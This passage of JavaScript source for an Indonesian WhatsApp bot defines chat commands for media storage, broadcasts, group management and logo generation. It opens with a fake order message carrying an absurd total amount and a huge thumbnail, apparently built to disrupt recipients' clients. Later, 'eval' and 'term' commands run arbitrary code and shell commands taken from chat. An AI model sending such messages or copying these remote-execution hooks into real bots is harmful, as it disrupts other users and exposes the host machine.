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",
							"itemCount": 2021,
							"status": "INQUIRY",
							"surface": "CATALOG",
							"orderTitle": "LOL",
							"message": "Hallo Kak",
							"sellerJid": "6288224859350@s.whatsapp.net",
							"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
							"totalAmount1000": "99999999999999999999",
							"totalCurrencyCode": "IDR",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: imeu,
						contextInfo: {}
					})

			Maslent
				.relayWAMessage(
					res)
			break
			//------------------<HEWAN MENU>---------------

			//------------------< Ingfo Bot >-------------------
		case 'runtime':
			textImg(
				`${runtime(process.uptime())}`
			)
			break
		case 'youtube':
			reply(
				`Jangan Lupa Subscribe YT Owner:\n https://youtube.com/channel/UCsvR9uwJPmSvuyucQ2a-ELA`
			)
			break
		case 'masukandata':
			reply(
				`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *©chi*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6285731632004`
			)
			break
		case 'ping':
		case 'speed':
			timestampe =
				speed();
			latensie = speed() -
				timestampe
			reply(
				`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`
			)
			break
		case 'botstat':
			groups = Maslent
				.chats.array
				.filter(v => v
					.jid
					.endsWith(
						'g.us'))
			privat = Maslent
				.chats.array
				.filter(v => v
					.jid
					.endsWith(
						's.whatsapp.net'
					))
			ram2 =
				`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
			charger =
				`${charging ? 'lagi dicas' : 'ga dicas'}`
			uptime = process
				.uptime();
			timestampe =
				speed();
			totalChat =
				await Maslent
				.chats.all()
			latensie = speed() -
				timestampe
			total = math(
				`${groups.length}*${privat.length}`
			)
			teks =
				`\`\`\`BOT STATISTICS\`\`\`
\`\`\`き⃟👉 Group Chats : ${groups.length}\`\`\`
\`\`\`き⃟👉 Private Chats : ${privat.length}\`\`\`
\`\`\`き⃟👉 Total Chats : ${totalChat.length}\`\`\`
\`\`\`き⃟👉 Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`き⃟👉 Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`き⃟👉 Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`き⃟👉 Ram Usage : ${ram2}\`\`\`
\`\`\`き⃟👉 Platform : ${os.platform()}\`\`\`
\`\`\`き⃟👉 Hostname : ${os.hostname()}\`\`\`
\`\`\`き⃟👉 Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`き⃟👉 Wa Version: ${Maslent.user.phone.wa_version}\`\`\`
\`\`\`き⃟👉 Os Version: ${Maslent.user.phone.os_version}\`\`\`
\`\`\`き⃟👉 Device Manufacturer: ${Maslent.user.phone.device_manufacturer}\`\`\`
\`\`\`き⃟👉 Device Model: ${Maslent.user.phone.device_model}\`\`\`
\`\`\`き⃟👉 Os Build Number: ${Maslent.user.phone.os_build_number}\`\`\``
			reply(teks)
			break
			//------------------< Owner >-------------------
		case 'addupdate':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!q) return reply(
				`Example: ${command} update fitur`
			)
			_update.push(q)
			fs.writeFileSync(
				'./database/bot/update.json',
				JSON
				.stringify(
					_update)
			)
			reply(
				`Update fitur berhasil ditambahkan ke database!`
			)
			break
		case 'delupdate':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			var reset = []
			_update = reset
			console.log(
				'Hang tight, it\'s time to reset'
			)
			//       fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))
			fs.readFileSync(
				'./database/bot/update.json',
				JSON
				.stringify(
					_update)
			)
			textImg(
				'Oke Desu ~'
			)
			break
		case 'update':
			let updateList =
				`*── 「 UPDATE BOT 」 ──*\n\n\n`
			for (let i of
					_update) {
				updateList +=
					`࿃ *${i.replace(_update)}*\n\n`
			}
			textImg(updateList)
			break
		case 'reset':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			var reset = []
			glimit = reset
			_update = reset
			console.log(
				'Hang tight, it\'s time to reset'
			)
			fs.writeFileSync(
				'./database/bot/glimit.json',
				JSON
				.stringify(
					glimit))
			fs.readFileSync(
				'./database/bot/update.json',
				JSON
				.stringify(
					_update)
			)
			textImg(
				'Oke Desu ~'
			)
			break
		case 'exif':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			const exifff =
				`${args.join(' ')}`
			const namaPack =
				exifff.split(
					'|')[0]
			const authorPack =
				exifff.split(
					'|')[1]
			exif.create(
				namaPack,
				authorPack)
			await reply(
				'Done gan')
			break
			//-----------add hiburan   
		case 'tupai':
			reply('PROSES')
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media =
				await Maslent
				.downloadAndSaveMediaMessage(
					encmedia)
			ran = getRandom(
				'.mp3')
			exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`,
				(err,
					stderr,
					stdout
				) => {
					fs.unlinkSync(
						media
					)
					if (err)
						return reply(
							'Error!'
						)
					hah = fs
						.readFileSync(
							ran
						)
					Maslent
						.sendMessage(
							from,
							hah,
							audio, {
								mimetype: 'audio/mp4',
								ptt: true,
								quoted: troli
							}
						)
					fs.unlinkSync(
						ran
					)
				})
			break
		case 'addstik':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!
				isQuotedSticker)
				return reply(
					'Reply stiker nya'
				)
			svst = body.slice(9)
			if (!svst)
				return reply(
					'Nama sticker nya apa?'
				)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await Maslent
				.downloadMediaMessage(
					boij)
			setiker.push(
				`${svst}`)
			fs.writeFileSync(
				`./XNXX2/stick/${svst}.webp`,
				delb)
			fs.writeFileSync(
				'./XNXX2/stick.json',
				JSON
				.stringify(
					setiker)
			)
			Maslent.sendMessage(
				from,
				`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`,
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'addimg':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!isQuotedImage)
				return reply(
					'Reply imagenya'
				)
			svst = body.slice(8)
			if (!svst)
				return reply(
					'Nama imagenya apa'
				)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await Maslent
				.downloadMediaMessage(
					boij)
			imagenye.push(
				`${svst}`)
			fs.writeFileSync(
				`./XNXX2/foto/${svst}jpeg`,
				delb)
			fs.writeFileSync(
				'./XNXX2/image.json',
				JSON
				.stringify(
					imagenye
				))
			Maslent.sendMessage(
				from,
				`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`,
				MessageType
				.text, {
					quoted: troli
				})
			break

		case 'addvid':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!isQuotedVideo)
				return reply(
					'Reply vidionya'
				)
			svst = body.slice(8)
			if (!svst)
				return reply(
					'Nama vidionya apa'
				)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await Maslent
				.downloadMediaMessage(
					boij)
			imagenye.push(
				`${svst}`)
			fs.writeFileSync(
				`./XNXX2/video/${svst}.mp4`,
				delb)
			fs.writeFileSync(
				'./XNXX2/video.json',
				JSON
				.stringify(
					imagenye
				))
			Maslent.sendMessage(
				from,
				`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`,
				MessageType
				.text, {
					quoted: troli
				})
			break

		case 'addvn':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!isQuotedAudio)
				return reply(
					'Reply vnnya'
				)
			svst = body.slice(7)
			if (!svst)
				return reply(
					'Nama audionya apa'
				)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await Maslent
				.downloadMediaMessage(
					boij)
			audionye.push(
				`${svst}`)
			fs.writeFileSync(
				`./XNXX2/audio/${svst}.mp3`,
				delb)
			fs.writeFileSync(
				'./XNXX2/vn.json',
				JSON
				.stringify(
					audionye
				))
			Maslent.sendMessage(
				from,
				`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`,
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'liststik':
			teks =
				'*Sticker list :*\n\n'
			for (let awokwkwk of
					setiker) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${setiker.length}*`
			Maslent.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": setiker
					}
				})
			break
		case 'listimg':
			teks =
				'*Image list :*\n\n'
			for (let awokwkwk of
					imagenye) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${imagenye.length}*`
			Maslent.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": setiker
					}
				})
			break
		case 'listvid':
			teks =
				'*List Video :*\n\n'
			for (let awokwkwk of
					videonye) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${videonye.length}* `
			Maslent.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": imagenye
					}
				})
			break
		case 'listvn':
			teks =
				'*List Vn:*\n\n'
			for (let awokwkwk of
					audionye) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${audionye.length}*`
			Maslent.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": audionye
					}
				})
			break
		case 'getstik':
			namastc = body
				.slice(9)
			try {
				result = fs
					.readFileSync(
						`./XNXX2/stick/${namastc}.webp`
					)
				Maslent
					.sendMessage(
						from,
						result,
						sticker, {
							quoted: troli
						})
			} catch {
				reply(
					'Pack tidak terdaftar'
				)
			}
			break
		case 'getimg':
			namastc = body
				.slice(8)
			try {
				buffer = fs
					.readFileSync(
						`./XNXX2/foto/${namastc}.jpeg`
					)
				Maslent
					.sendMessage(
						from,
						buffer,
						image, {
							quoted: troli,
							caption: `Result From Database : ${namastc}.jpeg`
						})
			} catch {
				reply(
					'Pack tidak terdaftar'
				)
			}
			break

		case 'getvid':
			namastc = body
				.slice(8)
			try {
				buffer = fs
					.readFileSync(
						`./XNXX2/video/${namastc}.mp4`
					)
				Maslent
					.sendMessage(
						from,
						buffer,
						video, {
							quoted: troli,
							caption: `Result From Database : ${namastc}.mp4`
						})
			} catch {
				reply(
					'Pack tidak terdaftar'
				)
			}
			break
		case 'getvn':
			namastc = body
				.slice(7)
			try {
				buffer = fs
					.readFileSync(
						`./XNXX2/audio/${namastc}.mp3`
					)
				Maslent
					.sendMessage(
						from,
						buffer,
						audio, {
							mimetype: 'audio/mp4',
							quoted: troli,
							ptt: true
						})
			} catch {
				reply(
					'Pack tidak terdaftar'
				)
			}
			break
		case 'join':
			if (!q) return reply(
				'Linknya?'
			)
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'https://chat.whatsapp.com/'
				))
				return reply(
					'Linknya Invalid Tod'
				)
			link = args[0]
				.replace(
					'https://chat.whatsapp.com/',
					'')
			fak = Maslent
				.query({
					json: ['action',
						'invite',
						link
					],
					expect200: true
				})
			reply(
				'Berhasil Masuk Grup'
			)
			break
		case 'eval':
			try {
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
					)
				sy = args.join(
					' ')
				return eval(sy)
			} catch (e) {
				reply(`${e}`)
			}
			break
		case 'getquoted':
			reply(JSON
				.stringify(
					mek
					.message
					.extendedTextMessage
					.contextInfo,
					null, 3)
			)
			break
		case 'bc':
		case 'broadcast':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					'teks?')
			anu = await Maslent
				.chats.all()
			if (isMedia && !mek
				.message
				.videoMessage ||
				isQuotedImage) {
				const encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				bc = await Maslent
					.downloadMediaMessage(
						encmedia
					)
				for (let _ of
						anu) {
					Maslent
						.sendMessage(
							_
							.jid,
							bc,
							image, {
								quoted: freply,
								caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`
							})
				}
				reply(
					'Suksess broadcast'
				)
			} else {
				for (let _ of
						anu) {
					sendMess(_
						.jid,
						`*「 PESAN SIARAN ${botname}」*\n\n${body.slice(4)}`
					)
				}
				reply(
					'Suksess broadcast'
				)
			}
			break
			/*        case 'bcbutton':
					Maslent.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await Maslent.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Maslent.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Maslent.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Maslent.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Maslent.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Maslent.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Maslent.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							//sendMess(_.jid, `${body.slice(4)}`)
buttons = [{buttonId: `menu`, buttonText: {displayText: '⎙ MENU DISNI'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'PEMBUAT BOT'}, type: 1}]
const btnbc = {
    contentText: `${body.slice(4)}`,
    footerText: 'Broadcast Maslent Teknologi © 2021',
    buttons: buttons,
    headerType: 1
}
await Maslent.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: mek})
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break*/
		case 'clearall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			anu = await Maslent
				.chats.all()
			Maslent
				.setMaxListeners(
					25)
			for (let _ of anu) {
				Maslent
					.deleteChat(
						_.jid)
			}
			reply(
				'Sukses delete all chat :)'
			)
			break
		case 'term':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!q) return
			exec(q, (err,
				stdout
			) => {
				if (err)
					return reply(
						`${err}`
					)
				if (
					stdout
				) {
					reply
						(
							stdout
						)
				}
			})
			break

		case 'shutdown':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			reply(`Bye...`)
			await sleep(3000)
			process.exit()
			break
		case 'start':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			reply(
				`OTEWE MENGHIDUPKAN MESIN😗`
			)
			await sleep(3000)
			process.exit()
			break
		case 'restart':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			reply(mess.wait)
			exec(`node main`)
			reply(
				'_Restarting Bot Success_'
			)
			break
		case 'leaveall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			let totalgroup =
				Maslent.chats
				.array.filter(
					u => u.jid
					.endsWith(
						'@g.us')
				).map(u => u
					.jid)
			for (let id of
					totalgroup) {
				sendMess(id,
					'Byee',
					null)
				await sleep(
					3000)
				Maslent
					.groupLeave(
						id)
			}
			break
			//------------------< G R U P >-------------------
		case 'linkgc':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			linkgc =
				await Maslent
				.groupInviteCode(
					from)
			yeh =
				`https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
			Maslent.sendMessage(
				from, yeh,
				text, {
					quoted: mek
				})
			break
		case 'kick':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			kick(from,
				mentionUser)
			break
		case 'add':
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined) {
				entah = arg
					.split("|")[
						0]
				entah = entah
					.replace(
						new RegExp(
							"[()+-/ +/]",
							"gi"
						),
						"")
				entah =
					`${entah}@s.whatsapp.net`
				Maslent
					.groupAdd(
						from, [
							entah
						])
			} else {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				Maslent
					.groupAdd(
						from, [
							entah
						])
			}
			break
		case 'tahta':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			tahta =
				await getBuffer(
					`https://api.zeks.xyz/api/hartatahta?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, tahta,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'kembangapi':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			api =
				await getBuffer(
					`https://api.zeks.me/api/tfire?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, api,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break

		case 'thunder':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			thunder = args.join(
				" ")
			thunder =
				await getBuffer(
					`https://api.zeks.xyz/api/thundertext?apikey=apivinz&text=${thunder}`
				)
			Maslent.sendMessage(
				from,
				thunder,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'blackpink':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			bp = args.join(" ")
			bp = await getBuffer(
				`https://api.zeks.xyz/api/logobp?apikey=apivinz&text=${bp}`
			)
			Maslent.sendMessage(
				from, bp,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'glitch':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}glitch nama|autor`
			)
			g1 = q.split('|')[0]
			g2 = q.split('|')[1]
			reply(mess.wait)
			glitch =
				await getBuffer(
					`https://api.zeks.xyz/api/gtext?apikey=apivinz&text1=${g1}&text2=${g2}`
				)
			Maslent.sendMessage(
				from,
				glitch,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'marvel':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}marvel nama|autor`
			)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			marvel =
				await getBuffer(
					`https://api.zeks.xyz/api/marvellogo?apikey=apivinz&text1=${m1}&text2=${m2}`
				)
			Maslent.sendMessage(
				from,
				marvel,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'serigala':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}serigala nama|autor`
			)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			serigala =
				await getBuffer(
					`https://api.zeks.me/api/wolflogo?apikey=apivinz&text1=${m1}&text2=${m2}`
				)
			Maslent.sendMessage(
				from,
				serigala,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'kembangapi':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			light =
				await getBuffer(
					`https://api.zeks.me/api/lithgtext?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, light,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break

		case 'light':
